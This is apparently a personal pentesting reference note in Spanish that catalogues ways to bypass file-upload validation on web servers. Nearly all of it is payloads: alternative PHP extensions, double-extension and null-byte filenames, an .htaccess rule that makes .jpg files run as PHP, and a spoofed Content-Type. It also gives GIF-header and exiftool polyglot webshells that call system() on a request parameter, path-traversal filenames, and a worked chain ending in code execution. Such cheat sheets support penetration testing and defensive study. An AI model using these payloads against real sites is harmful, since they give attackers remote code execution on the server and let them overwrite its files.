---
tipo: meta
aliases:
  - Payloads file upload
  - Payloads bypass de upload
tags:
  - meta/referencia
  - dominio/web
---

# File upload bypass - matriz de referencia

> [!info] Referencia pura, no un zettel
> Cada capa de validación tiene su bypass; se prueban en orden hasta que uno pasa. Criterio en [[File upload - bypass de validación]]. La webshell que subís está en [[Webshells - matriz de referencia]]. `yi``  ` copia.

## Extensión — lista negra

`shell.php`  →  bloqueado. Alternativas que el server igual ejecuta como PHP:

`.php3` `.php4` `.php5` `.php7` `.phtml` `.pht` `.phar`
Extensiones PHP alternativas que muchos handlers ejecutan igual.

`shell.pHp` / `shell.PHP`
Case: si la lista negra compara en minúscula pero el filesystem no distingue.

`shell.php.`
Punto final: Windows lo descarta al guardar, queda `shell.php`.

`shell.php%00.jpg` / `shell.php\x00.jpg`
Null byte: trunca en `.php`. Solo stacks viejos.

`shell.php.jpg` / `shell.jpg.php`
Doble extensión: la segunda gana si el server ejecuta por la última, o si Apache mal configurado ejecuta por cualquier `.php` en el nombre.

`shell.php:.jpg` / `shell.php;.jpg`
Separadores que algunos parsers cortan.

## Extensión — lista blanca

`.jpg` obligatorio. Vías:

`.htaccess`  con  `AddType application/x-httpd-php .jpg`
Subir un `.htaccess` que le diga a Apache que ejecute `.jpg` como PHP. Después la webshell `.jpg` corre.

`shell.jpg` + [[LFI - inclusión local]]
Si no ejecuta por sí solo, se incluye vía LFI (el combo).

## Content-Type / MIME

`Content-Type: image/png`  en la parte multipart
Cambiar el header en la request (Burp) aunque el archivo sea PHP. Vence validación que solo mira el `Content-Type` declarado.

## Magic bytes / firma

Cuando validan los primeros bytes del contenido:

`GIF89a;<?php system($_GET['c']); ?>`
Prepender la firma GIF: los magic bytes dicen "imagen", el resto es PHP ejecutable.

`\xFF\xD8\xFF` + PHP
Firma JPEG por delante.

## Polyglot — imagen válida + código

Un archivo que **es** una imagen válida Y contiene PHP: pasa validación de contenido (se abre como imagen) y ejecuta si se incluye/procesa como PHP. Se arma con `exiftool` metiendo el payload en un campo de comentario:

`exiftool -Comment='<?php system($_GET[c]); ?>' foto.jpg`

## Nombre — path traversal

`../../../var/www/html/shell.php`  como nombre del archivo
Si el nombre no se sanitiza, elige **dónde** cae el archivo — sacarlo de un directorio no ejecutable al webroot, o sobrescribir un archivo existente.

## Ejemplo

```
1. shell.php                         → "extensión no permitida"
2. shell.phtml                       → "extensión no permitida" (lista negra amplia)
3. shell.php + Content-Type: image/png → "el archivo no es una imagen" (validan contenido)
4. GIF89a;<?php ... ?> como shell.php.jpg + doble ext → sube y ejecuta
```

## Relacionadas

[[File upload - bypass de validación]] · [[Webshells - matriz de referencia]] · [[MOC - File upload]]
